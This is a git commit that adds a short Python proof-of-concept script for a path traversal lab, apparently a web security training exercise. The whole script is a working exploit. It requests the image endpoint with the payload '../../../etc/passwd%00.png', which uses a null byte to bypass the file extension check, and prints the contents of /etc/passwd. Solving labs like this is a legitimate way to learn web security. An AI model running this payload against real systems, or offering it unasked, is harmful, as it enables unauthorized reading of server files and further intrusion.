cd042efc08704d1bb8e607a862a471a65af6b20d
Sam.H <127937628+SamHzzz@users.noreply.github.com>
2024-05-12 18:17:58 +0800

    Create lab-validate-file-extension-null-byte-bypass.py

---
+++ Path_traversal/lab-validate-file-extension-null-byte-bypass.py
@@ -0,0 +1,37 @@
+# This lab contains a path traversal vulnerability in the display of product images.
+# The application validates that the supplied filename ends with the expected file extension.
+# To solve the lab, retrieve the contents of the /etc/passwd file.
+# PoC Script Credit to SamH
+
+import requests 
+import sys
+
+
+def check_url(raw_url):
+    return raw_url.rstrip('/')
+
+
+args = sys.argv[1:]
+
+try:
+    raw_url = args[0]
+    base_url = check_url(raw_url)
+except:
+    print("[!] Error\nUsage: python3 lab-simple.py <lab_url>")
+
+vuln_url = base_url + "/image?filename="
+payload = "../../../etc/passwd%00.png"
+
+try:
+    response = requests.get(vuln_url + payload)
+    if response.status_code == 200:
+        print("[+] Done!")
+        print("[+] /etc/passwd")
+        print(response.content)
+    else:
+        print(response.status_code)
+        print(response.content)
+except:
+    print("[!] Error\nUsage: python3 lab-simple.py <lab_url>")
+
+
